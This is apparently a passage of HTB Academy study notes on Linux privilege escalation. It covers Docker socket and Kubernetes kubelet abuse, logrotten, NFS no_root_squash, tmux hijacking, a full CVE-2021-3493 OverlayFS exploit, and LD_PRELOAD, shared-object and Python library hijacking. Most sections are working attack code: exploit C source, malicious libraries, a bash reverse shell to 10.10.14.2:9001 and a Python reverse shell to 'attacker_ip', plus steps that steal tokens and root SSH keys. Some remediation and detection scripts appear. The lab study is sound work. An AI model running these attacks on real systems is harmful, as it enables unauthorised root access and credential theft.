If a container has access to `/var/run/docker.sock` or a custom socket path (e.g., `/app/docker.sock`):

Bash

```
wget https://<server-ip>/docker -O docker
chmod +x docker
```

* **Theory**: Downloads a standalone `docker` CLI executable into `/tmp` if the binary is missing inside the container environment.

Bash

```
/tmp/docker -H unix:///app/docker.sock ps
```

* **`-H unix:///app/docker.sock`**: Specifies the path to the targeted UNIX socket instead of the default location.
* **`ps`**: Queries the daemon to list currently active containers.

Bash

```
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

* **`run`**: Instructs the daemon to create and launch a new container.
* **`--rm`**: Automatically deletes the container when it stops.
* **`-d`**: Runs the container in detached (background) mode.
* **`--privileged`**: Disables default security profiles (AppArmor/Seccomp) and grants extended capabilities to the container.
* **`-v /:/hostsystem`**: **Crucial Step.** Maps the host's entire root directory (`/`) to `/hostsystem` inside the new container.
* **`main_app`**: Specifies the base Docker image to use.

Bash

```
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

* **`exec -it <container_id> /bin/bash`**: Spawns an interactive pseudo-TTY bash shell inside the newly created container (`7ae3bcc818af`). From here, navigating to `/hostsystem/root/.ssh/id_rsa` reveals the host root user's SSH credentials.

#### Scenario C: Escalation via `docker` Group or Writable Socket

When an unprivileged host user belongs to the `docker` group or can write to `/var/run/docker.sock`:

Bash

```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

* **`run -v /:/mnt`**: Spawns an Ubuntu container with the host's root filesystem mounted at `/mnt`.
* **`--rm -it ubuntu`**: Runs the container interactively (`-it`) and cleans up upon exit (`--rm`).
* **`chroot /mnt bash`**: Changes the root directory context inside the container to `/mnt` (which is the host filesystem) and executes `bash`.
* **Result**: The process runs with effective UID 0 on the host filesystem, providing full root-level control over the target system.

### 4. Remediation & Hardening Practices

To prevent Docker-based privilege escalation:

| **Security Measure**          | **Implementation**                                                                                                                                         |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Restrict Group Membership** | Do not add non-administrative host users to the `docker` group.                                                                                            |
| **Protect `docker.sock`**     | Maintain restrictive file permissions (`660`, owned by `root:docker`). Never pass `docker.sock` inside untrusted containers.                               |
| **Enable Rootless Mode**      | Configure Docker to run in **Rootless Mode**, executing `dockerd` under an unprivileged user namespace so container escapes do not yield host root access. |
| **Read-Only Mounts**          | When mounting host directories, append `:ro` to enforce read-only access (e.g., `-v /path/host:/path/container:ro`).                                       |
| **Enable User Namespaces**    | Enable `--userns-remap=default` in `/etc/docker/daemon.json` to map container UID 0 to an unprivileged sub-UID on the host.                                |

***

***

## Kubernetes

The core takeaway is a classic cluster-compromise scenario: when the **Kubelet API** (port `10250`) allows **anonymous/unauthenticated access**, an attacker can execute commands inside existing pods, steal the pod's **Service Account JWT Token**, leverage that token against the **Kubernetes API Server** (port `6443`) to deploy a malicious pod that bind-mounts the host's root filesystem (`/`), and ultimately achieve **full root access to the host node**.

### Architecture & Component Overview

Kubernetes is divided into two primary zones: the **Control Plane** (Master Node) and **Worker Nodes** (Minions).

```
 +-----------------------------------------------------------------------+
 |                            CONTROL PLANE                              |
 |  +-------------------+   +--------------------+   +----------------+  |
 |  | kube-apiserver    |   | etcd               |   | kube-scheduler |  |
 |  | (Port 6443)       |   | (Ports 2379/2380)  |   | (Port 10251)   |  |
 |  +-------------------+   +--------------------+   +----------------+  |
 +----------------------------------|------------------------------------+
                                    |
                                    v
 +-----------------------------------------------------------------------+
 |                             WORKER NODE                               |
 |  +-----------------------------------------------------------------+  |
 |  | Kubelet Agent (Port 10250)                                      |  |
 |  |  - Manages pods, handles container execution via runtime        |  |
 |  +-----------------------------------------------------------------+  |
 |           |                                         |                 |
 |           v                                         v                 |
 |    +--------------+                          +--------------+         |
 |    | Pod (nginx)  |                          | Pod (app)    |         |
 |    +--------------+                          +--------------+         |
 +-----------------------------------------------------------------------+
```

#### Key Ports & Services

| **Service**                 | **Default Port** | **Role & Security Risk**                                                                          |
| --------------------------- | ---------------- | ------------------------------------------------------------------------------------------------- |
| **etcd**                    | `2379`, `2380`   | Key-value store for all cluster state and secrets. Direct access yields full cluster control.     |
| **kube-apiserver**          | `6443`           | Main management entry point. Processes REST commands (`kubectl`).                                 |
| **Kubelet API**             | `10250`          | Node-level daemon managing local pods. **If unauthenticated, allows direct container execution.** |
| **Kubelet Read-Only**       | `10255`          | Unauthenticated read-only endpoint (legacy/monitoring). Exposes pod specs and metadata.           |
| **kube-scheduler**          | `10251`          | Assigns unassigned pods to worker nodes.                                                          |
| **kube-controller-manager** | `10252`          | Runs controller processes (Node, ReplicaSet, Endpoints).                                          |

### Detailed Attack Chain & Command Breakdown

#### Step 1: Reconnaissance & Anonymous Kubelet Enumeration

**Command 1: Probing the API Server**

Bash

```
curl https://10.129.10.11:6443 -k
```

* **Explanation**: Tries to access the root REST endpoint of the primary API Server.
* **`-k`**: Ignores self-signed SSL/TLS certificate warnings.
* **Result**: Returns `403 Forbidden` (`system:anonymous cannot get path "/"`). This confirms the main API server enforces authentication.

**Command 2: Querying Kubelet via Raw HTTP**

Bash

```
curl https://10.129.10.11:10250/pods -k | jq .
```

* **Explanation**: Sends an unauthenticated request to the Kubelet daemon's `/pods` endpoint to list all running pods on that node.
* **`jq .`**: Formats the JSON response for readability.
* **Result**: Returns a `PodList` JSON object exposing pod names, namespaces, container images, environment variables, and annotations.

**Command 3: Listing Pods with `kubeletctl`**

Bash

```
kubeletctl -i --server 10.129.10.11 pods
```

* **`kubeletctl`**: A dedicated CLI tool for interacting with unauthenticated Kubelet APIs.
* **`-i`**: Insecure mode (skips SSL verification).
* **`pods`**: Formats the output into an easy-to-read table showing Pod Name, Namespace, and Containers.

**Command 4: Scanning for Remote Code Execution (RCE)**

Bash

```
kubeletctl -i --server 10.129.10.11 scan rce
```

* **Explanation**: Tests each container on the node to see if the Kubelet API allows command execution endpoints (`exec`).
* **Result**: Shows a `+` next to the `nginx` pod in the `default` namespace, indicating execution is allowed without authentication.

#### Step 2: Initial Access & Credential Harvesting

**Command 5: Executing Commands Inside the Container**

Bash

```
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

* **`exec "id"`**: Runs the `id` binary inside the specified container.
* **`-p nginx`**: Target pod name.
* **`-c nginx`**: Target container name.
* **Result**: Returns `uid=0(root)`. Confirms root command execution inside the container.

**Command 6: Stealing the Service Account JWT Token**

Bash

```
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

* **`/var/run/secrets/kubernetes.io/serviceaccount/token`**: Default mount path where Kubernetes injects the pod's identity token (JSON Web Token).
* **`| tee -a k8.token`**: Prints the token to standard output and appends it to a local file named `k8.token`.

**Command 7: Stealing the Cluster CA Certificate**

Bash

```
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

* **`/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`**: The Root Certificate Authority cert used to validate TLS connections to the internal Kubernetes API server. Saved locally as `ca.crt`.

#### Step 3: RBAC Enumeration via API Server

**Command 8: Checking Cluster Permissions**

Bash

```
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

* **`export token=...`**: Stores the harvested token in an environment variable.
* **`kubectl`**: Official Kubernetes administration CLI.
* **`--token=$token`**: Authenticates using the stolen pod Service Account token.
* **`--certificate-authority=ca.crt`**: Validates the API server's SSL cert using the stolen CA certificate.
* **`auth can-i --list`**: Asks the cluster Role-Based Access Control (RBAC) engine: _"What actions can this token perform?"_
* **Result**: Shows `pods [get, create, list]`. This reveals that the Service Account has permission to deploy new pods to the cluster.

#### Step 4: Host Escape via Malicious Pod Creation

**Command 9: Analyzing the Malicious Pod Manifest (`privesc.yaml`)**

YAML

```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root                   # Path inside the container
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /                           # Mounts host node's / directory
  automountServiceAccountToken: true
  hostNetwork: true
```

* **`hostPath: path: /`**: **The Critical Security Flaw.** Instructs the host node to take its actual root filesystem (`/`) and mount it into the new pod.
* **`volumeMounts: mountPath: /root`**: Places the host's `/` filesystem inside the container under the `/root` folder.
* **`hostNetwork: true`**: Allows the pod to use the host node's network interfaces directly.

**Command 10: Deploying the Malicious Pod**

Bash

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

* **`apply -f privesc.yaml`**: Submits the manifest to the API server to create the `privesc` pod.

**Command 11: Verifying Pod Execution**

Bash

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

* **`get pods`**: Verifies that `privesc` is in a `Running` state.

**Command 12: Extracting Host Root Credentials**

Bash

```
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

* **`exec "cat /root/root/.ssh/id_rsa"`**: Reads the file inside the container located at `/root/root/.ssh/id_rsa`.
* **Path Translation**: Because host `/` was mounted to container `/root`, reading `/root/root/.ssh/id_rsa` reads the **host's actual `/root/.ssh/id_rsa` file**.
* **Impact**: The attacker retrieves the SSH private key for the physical/virtual host node, achieving complete host takeover.

### Security Mitigations

To defend Kubernetes against this attack vector:

1.  **Disable Anonymous Kubelet Authentication**:

    In Kubelet configuration, set `--anonymous-auth=false` and enforce Webhook authentication (`--authorization-mode=Webhook`).
2.  **Restrict Pod Mounting Capabilities**:

    Enforce **Pod Security Standards (PSS)** or admission controllers (e.g., Gatekeeper/Kyverno) to prohibit `hostPath` volumes and restrict `hostNetwork`.
3.  **Apply Least-Privilege RBAC**:

    Ensure pod Service Accounts are not granted cluster-wide `create pods` or high-privilege permissions unless strictly necessary. Set `automountServiceAccountToken: false` where possible.

***

***

## Logrotate

Logrotate automates the rotation, compression, and removal of system log files in `/var/log` to prevent disk exhaustion. If logrotate runs as root and operates on a file located in a directory where an attacker has write permissions, race conditions (exploited via tools like `logrotten`) allow a local user to substitute log files with symlinks and execute arbitrary commands as root.

**Command Breakdown**

* **`man logrotate` / `logrotate --help`**: Displays the manual page or help menu detailing command flags (e.g., `-d` for debug dry-runs, `-f` to force immediate rotation).
* **`cat /etc/logrotate.conf`**: Prints the main global configuration file containing baseline directives like rotation intervals (`weekly`), retention limits (`rotate 4`), and log creation defaults (`create`).
* **`sudo cat /var/lib/logrotate.status`**: Reads the logrotate state file to check timestamps showing when each specific log file was last rotated.
* **`ls /etc/logrotate.d/`**: Lists service-specific rotation configs (such as `dpkg`, `apt`, or `rsyslog`) stored in the modular configuration directory.
* **`cat /etc/logrotate.d/dpkg`**: Displays specific log management rules for `dpkg`, including retention limits, compression directives, and file permissions (`create 644 root root`).
* **`git clone [https://github.com/whotwagner/logrotten.git](https://github.com/whotwagner/logrotten.git)`**: Clones the `logrotten` exploit repository from GitHub onto the target or build machine.
* **`cd logrotten`**: Moves into the cloned repository directory.
* **`gcc logrotten.c -o logrotten`**: Compiles the `logrotten.c` C source code file into a runnable binary output named `logrotten`.
* **`echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload`**: Writes a standard Bash interactive reverse shell command pointing to the attacker's listener (`10.10.14.2:9001`) into a file called `payload`.
* **`grep "create\|compress" /etc/logrotate.conf | grep -v "#"`**: Searches `logrotate.conf` for uncommented active directives containing `create` or `compress` to determine which exploit mode `logrotten` needs to run in.
* **`nc -nlvp 9001`**: Launches a Netcat listener (`-n` no DNS resolution, `-l` listen, `-v` verbose, `-p` port) on port `9001` to catch the incoming root reverse shell.
* **`./logrotten -p ./payload /tmp/tmp.log`**: Runs the exploit, specifying the execution payload (`-p ./payload`) and monitoring the target log file (`/tmp/tmp.log`). When logrotate executes against the target log, `logrotten` triggers a symlink race condition to execute the payload with root privileges.

***

***

## Miscellaneous Techniques

### 1. Passive Network Traffic Capture

If an unprivileged user has access to packet capture utilities (like `tcpdump`) or readable PCAP files, they can inspect raw network traffic to extract credentials transmitted in cleartext (HTTP, FTP, POP3, IMAP, Telnet, SNMP) or capture authentication hashes (Net-NTLMv2, Kerberos) for offline cracking.

#### Core Commands

| **Command**                           | **Description**                                                                              |
| ------------------------------------- | -------------------------------------------------------------------------------------------- |
| **`tcpdump -i eth0 -w capture.pcap`** | Captures all raw network packets on interface `eth0` and saves them to a PCAP file.          |
| **`python3 net-creds.py -i eth0`**    | Live-sniffs cleartext passwords, hashes, and tokens from network interfaces.                 |
| **`Pcredz -f capture.pcap`**          | Parses PCAP files to extract credentials and NTLM/Kerberos hashes using regular expressions. |

### 2. Weak NFS Privileges (`no_root_squash`)

By default, NFS uses **root squashing** to map client `root` requests to an unprivileged account (`nfsnobody`). When a share is configured with **`no_root_squash`**, remote root users retain full root permissions on the exported filesystem. An attacker can write a SUID root binary to the mounted share on their attacking machine, which becomes an executable SUID root binary on the target machine.

#### Command Breakdown

**Phase 1: Reconnaissance**

* **`showmount -e 10.129.2.12`** Queries the target NFS server (`10.129.2.12`) to list all active network exports (`/tmp`, `/var/nfs/general`).
* **`cat /etc/exports`** Displays the target's NFS configuration file. Look for `(rw,no_root_squash)` enabled on exported folders.

**Phase 2: Payload Creation & Mounting (Attacker Machine / Pwnbox)**

* **`cat shell.c`** Writes a C program wrapper that sets execution privileges to root (`setuid(0); setgid(0);`) and executes `/bin/bash`.
* **`gcc shell.c -o shell`** Compiles the C code into an executable ELF binary named `shell`.
* **`sudo mount -t nfs 10.129.2.12:/tmp /mnt`** Mounts the target host's remote `/tmp` export onto the local `/mnt` directory.
* **`cp shell /mnt`** Copies the compiled `shell` binary into `/mnt`, writing it directly to `/tmp` on the target machine.
* **`chmod u+s /mnt/shell`** Applies the SUID bit (`u+s`) to the binary. Because this is executed as local `root` over a `no_root_squash` share, the file owner on the target remains `root:root` with SUID active (`-rwsr-xr-x`).

**Phase 3: Privilege Escalation (Target Host Session)**

* **`ls -la /tmp`** Verifies that `shell` is present in `/tmp` with SUID permissions (`-rwsr-xr-x 1 root root`).
* **`./shell`** Executes the SUID binary, elevating the current shell process to effective `uid=0(root)`.

### 3. Hijacking Shared Tmux Sessions

`tmux` allows administrators to create shared terminal sessions bound to specific UNIX socket files (`-S`). If a root user creates a tmux session with socket permissions readable/writable by a custom group (e.g., `devs`), any user belonging to that group can attach to the socket and hijack the active root terminal.

#### Command Breakdown

**Root Administrator Setup (For Context)**

* **`tmux -S /shareds new -s debugsess`** Creates a new tmux session named `debugsess` bound to a explicit socket file path at `/shareds`.
* **`chown root:devs /shareds`** Changes group ownership of the socket file to `devs` so members of that group can write to it.

**Attacker Exploitation Steps**

* **`ps aux | grep tmux`** Searches running processes to detect active `tmux` sessions running as `root` and identifies custom socket arguments (`-S /shareds`).
* **`ls -la /shareds`** Checks file permissions on the socket (`srw-rw---- 1 root devs`) to confirm group write access.
* **`id`** Verifies that the low-privileged attacker account belongs to the target group (`groups=1000(htb),1011(devs)`).
* **`tmux -S /shareds`** Attaches directly to the socket file `/shareds`, placing the attacker straight inside the running root `tmux` session.

***

***

## Kernel Exploits

**1.Enumerate System & Kernel Details:**&#x49;dentify the OS distribution and kernel release version.

Check the running kernel version and OS architecture using system commands:

Bash

```
uname -a
```

* **What it does:** Displays host architecture (`x86_64`), hostname, kernel release number (e.g., `4.15.0-76-generic`), and build date.

Bash

```
cat /etc/lsb-release
```

* **What it does:** Prints the Linux distribution name, release version (e.g., `Ubuntu 18.04`), and codename.

**2.Write the 2021 Kernel Exploit Code:**&#x43;VE-2021-3493 OverlayFS Exploit.

Change to a world-writable directory like `/tmp` and write the C exploit code directly to a file:

Bash

```
cd /tmp
cat << 'EOF' > exploit.c
#define _GNU_SOURCE
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 

int main() {
    pid_t pid = fork();
    if (pid == 0) {
        uid_t uid = getuid();
        gid_t gid = getgid();
        system("rm -rf /tmp/ovl");
        mkdir("/tmp/ovl", 0777);
        mkdir("/tmp/ovl/work", 0777);
        mkdir("/tmp/ovl/upper", 0777);
        mkdir("/tmp/ovl/lower", 0777);
        mkdir("/tmp/ovl/merge", 0777);
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
            perror("unshare");
            exit(1);
        }
        FILE *f = fopen("/proc/self/uid_map", "w");
        if (f) { fprintf(f, "0 %d 1\n", uid); fclose(f); }
        f = fopen("/proc/self/setgroups", "w");
        if (f) { fprintf(f, "deny\n"); fclose(f); }
        f = fopen("/proc/self/gid_map", "w");
        if (f) { fprintf(f, "0 %d 1\n", gid); fclose(f); }
        if (mount("overlay", "/tmp/ovl/merge", "overlay", 0, "lowerdir=/tmp/ovl/lower,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work") != 0) {
            perror("mount");
            exit(1);
        }
        system("cp /bin/bash /tmp/ovl/merge/ofs && chmod 4755 /tmp/ovl/merge/ofs");
        umount("/tmp/ovl/merge");
        exit(0);
    }
    wait(NULL);
    execl("/tmp/ovl/upper/ofs", "ofs", "-p", NULL);
    return 0;
}
EOF
```

* **What it does:** Exploits a missing check in Ubuntu's OverlayFS implementation to set SUID root permissions on a copied `/bin/bash` binary.

**3.Compile and Grant Execution Permissions:**&#x43;onvert C source code into an executable binary.

Compile the C source code with `gcc` and make it executable:

Bash

```
gcc exploit.c -o exploit && chmod +x exploit
```

* **`gcc exploit.c -o exploit`:** Compiles the source file into a runnable binary named `exploit`.
* **`chmod +x exploit`:** Adds execution permissions (`+x`) so the binary can be run by the current user.

**4.Execute Exploit and Read the Flag:**&#x45;scalate privileges to root.

Run the compiled binary to drop into a root shell and retrieve the lab flag:

Bash

```
./exploit
```

* **What it does:** Triggers the kernel vulnerability and executes the SUID bash binary with root privileges (`euid=0`).

Verify root identity and display the flag content:

Bash

```
whoami
cat /root/kernel_exploit/flag.txt
```

* **`whoami`:** Confirms current user context (`root`).
* **`cat /root/kernel_exploit/flag.txt`:** Reads the required module answer.

***

***

## Shared Libraries

Dynamic dynamic linking allows Linux binaries to load shared object (`.so`) libraries at runtime. The `LD_PRELOAD` environment variable forces a program to load a specified library before any standard ones. If a user has permission to run a binary with `sudo` and the `/etc/sudoers` configuration includes `env_keep+=LD_PRELOAD`, an attacker can supply a custom shared library to the command. The constructor function `_init()` inside the custom library immediately runs inside the elevated process context, setting the process UID to `0` and spawning a `root` shell.

#### Exploitation Code (`root.c`)

C

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

* **`void _init()`**: Special constructor function that executes automatically as soon as the dynamic linker loads the library into memory.
* **`unsetenv("LD_PRELOAD");`**: Removes `LD_PRELOAD` to prevent recursive library execution when spawning new subshells.
* **`setgid(0);` / `setuid(0);`**: Sets the real and effective Group and User IDs to `0` (`root`).
* **`system("/bin/bash");`**: Launches an interactive root shell.

#### Commands & Usage Breakdown

**1. Inspect Dynamic Dependencies**

Bash

```
ldd /bin/ls
```

* **Usage:** Prints all shared dynamic dynamic libraries (`.so`) required by a binary along with their resolved system file paths.

**2. Check Sudo Privileges & Environment Settings**

Bash

```
sudo -l
```

* **Usage:** Checks the current user's `sudo` rights. Verifies two key prerequisites:
  1. `env_keep+=LD_PRELOAD` is listed under `Matching Defaults entries`.
  2. A permitted `sudo` executable exists (e.g., `(root) NOPASSWD: /usr/sbin/apache2 restart`).

**3. Compile C Payload into a Shared Object**

Bash

```
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

* **`-fPIC`**: Position-Independent Code; required for dynamic libraries so code can execute at any memory location.
* **`-shared`**: Directs `gcc` to create a shared object (`.so`) instead of an executable binary.
* **`-o /tmp/root.so`**: Specifies the output file path.
* **`-nostartfiles`**: Excludes standard C runtime startup files, allowing `_init()` to trigger immediately upon loading.

**4. Trigger Privilege Escalation**

Bash

```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

* **Usage:** Executes the allowed `sudo` command while injecting the compiled library path through `LD_PRELOAD`. The dynamic linker loads `/tmp/root.so` under root permissions, executes `_init()`, and drops into a root shell.

***

***

## Shared Object Hijacking

Shared object hijacking exploits custom library dependencies in SUID binaries through writable RUNPATH directories, allowing malicious library injection for privilege escalation.

### 🔍 Prerequisites & Detection

#### Find SUID Binaries with Custom Libraries

```
# Find SUID binaries
find / -type f -perm -4000 2>/dev/null

# Check library dependencies
ldd binary_name

# Look for non-standard libraries
# Example: libshared.so => /development/libshared.so
```

#### Check RUNPATH Configuration

```
# Check RUNPATH/RPATH settings
readelf -d binary_name | grep PATH

# Example output:
# 0x000000000000001d (RUNPATH) Library runpath: [/development]
```

#### Verify Directory Permissions

```
# Check if RUNPATH directory is writable
ls -la /development/
# drwxrwxrwx 2 root root 4096 Sep 1 22:06 /development/

# Test write access
touch /development/test && rm /development/test
```

### 🚀 Exploitation Process

#### Step 1: Identify Missing Function

```
# Copy existing library to trigger error
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

# Execute binary to see missing function
./payroll
# Output: undefined symbol: dbquery
```

#### Step 2: Create Malicious Library

```
# Create malicious shared object
cat > exploit.c << EOF
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF
```

#### Step 3: Compile and Deploy

```
# Compile malicious library
gcc exploit.c -fPIC -shared -o /development/libshared.so

# Verify library placement
ls -la /development/libshared.so
```

#### Step 4: Execute and Escalate

```
# Execute SUID binary
./payroll

# Should get root shell
# id
# uid=0(root) gid=1000(user) groups=1000(user)
```

### 🔧 Advanced Techniques

#### Function Discovery Methods

```
# Use strings to find function names
strings binary_name | grep -E "^[a-zA-Z_][a-zA-Z0-9_]*$"

# Use objdump for detailed analysis
objdump -T binary_name

# Use nm for symbol table
nm -D binary_name

# Use strace to see runtime calls
strace ./binary_name 2>&1 | grep -E "open.*\.so"
```

#### Multiple Function Implementation

```
# If binary needs multiple functions
cat > multi.c << EOF
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/bash -p");
}

void calculate_salary() {
    return;  // Dummy implementation
}

void print_report() {
    return;  // Dummy implementation
}
EOF
```

### 🔍 Detection & Enumeration

#### Shared Object Hijacking Check

```
#!/bin/bash
echo "=== SHARED OBJECT HIJACKING CHECK ==="

echo "[+] SUID binaries with custom libraries:"
find / -type f -perm -4000 2>/dev/null | while read binary; do
    libs=$(ldd "$binary" 2>/dev/null | grep -v "linux-vdso\|ld-linux" | awk '{print $3}')
    for lib in $libs; do
        if [ ! -z "$lib" ] && [ "$lib" != "/lib/x86_64-linux-gnu/"* ] && [ "$lib" != "/usr/lib/"* ]; then
            echo "  Binary: $binary"
            echo "  Custom lib: $lib"
            dir=$(dirname "$lib")
            if [ -w "$dir" ]; then
                echo "  [!] WRITABLE: $dir"
            fi
        fi
    done
done

echo "[+] Checking RUNPATH configurations:"
find / -type f -perm -4000 2>/dev/null | while read binary; do
    runpath=$(readelf -d "$binary" 2>/dev/null | grep "RUNPATH\|RPATH")
    if [ ! -z "$runpath" ]; then
        echo "  Binary: $binary"
        echo "  $runpath"
    fi
done
```

#### Quick Analysis Commands

```
# Check specific binary
ldd ./suspicious_binary
readelf -d ./suspicious_binary | grep PATH

# Test library loading
LD_LIBRARY_PATH=/tmp ./binary_name

# Check writable library directories
find /opt /usr/local /development -type d -writable 2>/dev/null
```

### 🔑 Quick Reference

#### Immediate Checks

```
# Find SUID with custom libs
find / -type f -perm -4000 -exec ldd {} \; 2>/dev/null | grep -E "/opt/|/development/|/usr/local/"

# Check RUNPATH
find / -perm -4000 -exec readelf -d {} \; 2>/dev/null | grep "RUNPATH\|RPATH"

# Writable lib directories
ls -la /development/ /opt/lib/ /usr/local/lib/ 2>/dev/null
```

#### Emergency Exploitation

```
# If vulnerable SUID found with writable RUNPATH
echo 'void FUNCTION_NAME(){setuid(0);system("/bin/sh -p");}' > exploit.c
gcc exploit.c -fPIC -shared -o /writable/path/library.so
./vulnerable_suid_binary
```

#### HTB Academy Workflow

```
# 1. Find SUID binary
find / -type f -perm -4000 2>/dev/null

# 2. Check dependencies and RUNPATH
ldd ./payroll
readelf -d ./payroll | grep PATH

# 3. Identify missing function
./payroll  # Note error: undefined symbol: dbquery

# 4. Create and compile exploit
gcc exploit.c -fPIC -shared -o /development/libshared.so

# 5. Execute for root shell
./payroll
```

***

***

## 🐍Python Library Hijacking

### 🎯 Overview

Python library hijacking exploits Python's module import system through writable modules, path manipulation, or PYTHONPATH environment variable abuse to achieve privilege escalation.

### 🔍 Attack Vectors

#### 1. Wrong Write Permissions

* **Writable Python modules** in system directories
* **SUID Python scripts** importing vulnerable modules
* **Direct code injection** into existing modules

#### 2. Library Path Manipulation

* **Higher priority paths** in sys.path that are writable
* **Module name collision** with legitimate modules
* **Path precedence exploitation**

#### 3. PYTHONPATH Environment Variable

* **sudo SETENV permissions** for Python
* **Environment variable manipulation** to redirect imports
* **Custom module directories** via PYTHONPATH

### 🔍 Enumeration & Detection

#### Check Python Paths

```
# List Python import paths (priority order)
python3 -c 'import sys; print("\n".join(sys.path))'

# Check for writable paths
python3 -c 'import sys; print("\n".join(sys.path))' | while read path; do
    if [ -w "$path" 2>/dev/null ]; then
        echo "WRITABLE: $path"
    fi
done
```

#### Find SUID Python Scripts

```
# Find SUID Python scripts
find / -name "*.py" -perm -4000 2>/dev/null

# Check script contents
cat suspicious_script.py
```

#### Check Sudo Permissions

```
# Look for SETENV permissions
sudo -l | grep -E "(SETENV|python)"

# Example: (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

### 🚀 Exploitation Methods

#### Method 1: Writable Module Hijacking

```
# 1. Find SUID Python script
ls -la mem_status.py
# -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

# 2. Check imports
cat mem_status.py
# import psutil

# 3. Find module location
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

# 4. Check permissions
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff 87339 Dec 13 20:07

# 5. Inject malicious code
# Edit the virtual_memory() function:
# def virtual_memory():
#     import os
#     os.system('id')  # or os.system('/bin/bash')
```

#### Method 2: Path Precedence Exploitation

```
# 1. Check Python paths
python3 -c 'import sys; print("\n".join(sys.path))'

# 2. Find writable higher-priority directory
ls -la /usr/lib/python3.8/
# drwxr-xrwx 30 root root 20480 Dec 14 16:26

# 3. Create malicious module
cat > /usr/lib/python3.8/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
    # Return None to avoid attribute errors
EOF

# 4. Execute SUID script
sudo python3 mem_status.py
```

#### Method 3: PYTHONPATH Environment Variable

```
# 1. Check sudo SETENV permissions
sudo -l | grep SETENV

# 2. Create malicious module in accessible directory
cat > /tmp/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('/bin/bash')
EOF

# 3. Execute with custom PYTHONPATH
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

### 🔧 Advanced Techniques

#### Multi-Function Module Creation

```
# Create comprehensive replacement module
cat > /tmp/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
    # Return fake object to avoid errors
    class FakeMemory:
        def __init__(self):
            self.total = 100
            self.available = 80
    return FakeMemory()

# Add other common functions to avoid errors
def cpu_percent(): return 50
def disk_usage(path): return None
EOF
```

#### Reverse Shell Integration

```
cat > /tmp/hijacked_module.py << EOF
#!/usr/bin/env python3
import os
import socket
import subprocess

def target_function():
    # Reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
EOF
```

### 🔍 Detection Script

```
#!/bin/bash
echo "=== PYTHON LIBRARY HIJACKING CHECK ==="

echo "[+] Python paths (priority order):"
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null

echo "[+] Writable Python paths:"
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null | while read path; do
    if [ -w "$path" 2>/dev/null ]; then
        echo "  WRITABLE: $path"
    fi
done

echo "[+] SUID Python scripts:"
find / -name "*.py" -perm -4000 2>/dev/null

echo "[+] Python sudo permissions:"
sudo -l 2>/dev/null | grep -E "(SETENV.*python|python.*SETENV)"

echo "[+] Writable site-packages:"
find /usr -name "site-packages" -writable 2>/dev/null
find /usr -name "dist-packages" -writable 2>/dev/null
```

### 🔑 Quick Reference

#### Immediate Checks

```
# Check Python paths
python3 -c 'import sys; print("\n".join(sys.path))'

# Find SUID Python scripts
find / -name "*.py" -perm -4000 2>/dev/null

# Check sudo SETENV
sudo -l | grep SETENV | grep python
```

#### Emergency Exploitation

```
# If writable high-priority path found
echo 'import os; def target_function(): os.system("/bin/bash")' > /writable/path/module.py

# If PYTHONPATH manipulation allowed
sudo PYTHONPATH=/tmp/ python3 script.py

# Quick module replacement
cp legitimate_module.py malicious_module.py
# Edit malicious_module.py to add: os.system('/bin/bash')
```

#### HTB Academy Lab Example

```
# 1. Connect to target
ssh htb-student@target

# 2. Check environment
ls  # mem_status.py
cat mem_status.py
# #!/usr/bin/env python3
